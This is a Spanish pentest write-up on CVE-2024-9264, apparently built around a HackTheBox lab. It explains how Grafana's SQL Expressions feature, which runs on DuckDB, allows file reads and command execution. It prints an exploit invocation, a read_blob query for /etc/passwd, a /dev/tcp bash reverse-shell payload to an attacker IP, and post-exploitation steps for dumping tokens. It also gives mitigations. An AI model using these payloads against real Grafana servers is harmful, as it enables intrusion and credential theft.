## ğŸ¯ CVE-2024-9264 â€” Explotando Grafana para RCE / LFI via SQL Expressions

---

### ğŸ› ï¸ Contexto para pentesters

Grafana, ampliamente usado para visualizaciÃ³n de mÃ©tricas y dashboards, puede ser un blanco muy jugoso durante una intrusiÃ³n. Aunque muchas veces se usa solo como herramienta de monitorizaciÃ³n y dashboards, cuando es mal configurado o expuesto pÃºblicamente, puede ofrecer **un punto de entrada completo al sistema**.

Este CVE permite a un atacante con **credenciales vÃ¡lidas (hasta con rol VIEWER)** ejecutar comandos en el sistema o leer archivos sensibles si ciertas condiciones se cumplen.

---

### ğŸ§¨ Vulnerabilidad: SQL Expressions + DuckDB = LFI/RCE

**CVE-2024-9264** afecta a la funcionalidad experimental **SQL Expressions** introducida en Grafana 11. Esta permite crear consultas SQL sobre datos previamente cargados... pero internamente usa el motor **DuckDB** para procesarlas.

El problema es que **el input del usuario no se filtra adecuadamente**, y DuckDB **permite funciones como `read_file`, `read_blob`, `pragma`, y mÃ¡s** que pueden ser abusadas para leer archivos arbitrarios o incluso ejecutar cÃ³digo si el entorno lo permite.

---

### ğŸ§ª Requisitos para explotaciÃ³n exitosa

| Requisito                                  | Necesario para                                                                   |
| ------------------------------------------ | -------------------------------------------------------------------------------- |
| Credenciales vÃ¡lidas (VIEWER+)             | Acceso a dashboards para crear o modificar paneles                               |
| Acceso a la funcionalidad â€œSQL Expressionâ€ | FunciÃ³n activa en versiones 11.x                                                 |
| Binario `duckdb` en el `$PATH` del sistema | Requisito para que la funcionalidad funcione (por defecto **no estÃ¡ instalado**) |

---

### âš”ï¸ Escenario de pentest

Supongamos que en una mÃ¡quina de HackTheBox encuentras un panel en `http://grafana.planning.htb` con las siguientes credenciales vÃ¡lidas:

```
usuario: admin
password: 0D5oT70Fq13EvB5r
```

Y ejecutas el siguiente exploit:

```bash
python3 grafanaexploit.py \
  --url 'http://grafana.planning.htb' \
  --username 'admin' \
  --password '0D5oT70Fq13EvB5r' \
  --reverse-ip '10.10.14.6' \
  --reverse-port '443'
```

El script intenta automatizar los siguientes pasos:

1. Iniciar sesiÃ³n con las credenciales.
2. Crear un nuevo dashboard/panel usando SQL Expressions.
3. Inyectar un payload que lee un archivo o ejecuta un comando vÃ­a DuckDB.
4. Si RCE: lanzar reverse shell a tu IP (listener en 443).
5. Si no hay RCE posible, intentarÃ¡ LFI (`read_file`, `read_blob`, etc.)

---

### ğŸ“‚ TÃ©cnicas de explotaciÃ³n

#### ğŸ§¬ LFI con SQL Expression

```sql
SELECT content FROM read_blob('/etc/passwd')
```

DuckDB ejecuta esto y devuelve el contenido del archivo como parte de los datos del panel. TambiÃ©n puedes probar rutas mÃ¡s interesantes:

* `/proc/self/environ`
* `/etc/grafana/grafana.ini`
* `./conf/defaults.ini`
* `./data/grafana.db` (Â¡base de datos completa de Grafana!)

---

#### ğŸ”¥ RCE vÃ­a DuckDB PRAGMA

En versiones especÃ­ficas, DuckDB permite ejecutar comandos usando PRAGMA o funciones no documentadas. El exploit se apoya en funciones de sistema que pueden abrir pipes, leer comandos o abusar del sistema de archivos si el entorno lo permite.

Ejemplo (simplificado):

```sql
SELECT * FROM system('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"')
```

> **Nota**: Esta tÃ©cnica puede requerir habilitar ciertos flags internos o depender de una versiÃ³n vulnerable especÃ­fica de DuckDB que estÃ© en el sistema.

---

### ğŸª“ Persistencia + Pivoting

Una vez que obtienes shell:

* Dump del archivo `grafana.db` â†’ contiene tokens de API, usuarios, sesiones.
* Buscar integraciones con otras herramientas: Prometheus, Loki, AWS, etc.
* Revisar `/etc/passwd`, `sudo -l`, `cron jobs`, `env`, etc.
* Posible movimiento lateral si la mÃ¡quina corre como `grafana` user con acceso a otros recursos.

---

### ğŸ“Œ Recomendaciones para Red Teams

* Grafana expuesto pÃºblicamente â†’ potencial punto de entrada silencioso si los logs estÃ¡n mal configurados.
* Usuarios VIEWER tienen **mÃ¡s poder del que parece** si la funciÃ³n `SQL Expressions` estÃ¡ activa.
* La explotaciÃ³n no genera errores visibles para el usuario, lo que permite RCE **sin alertas inmediatas**.

---

### ğŸ§± MitigaciÃ³n para defensores (Blue Team)

* Actualizar Grafana a 11.2.1+security o superior.
* Eliminar el binario `duckdb` del sistema si no se usa.
* Revocar permisos para usuarios no autorizados en dashboards que usen SQL Expressions.
* Auditar dashboards que contienen `read_blob`, `read_file`, etc.

---

### ğŸ”— Referencias Ãºtiles

* ğŸ”— [Exploit oficial - GitHub](https://github.com/nollium/CVE-2024-9264)
* ğŸ”— [Advisory oficial de Grafana](https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/)
* ğŸ“„ [SecLists de archivos sensibles para LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)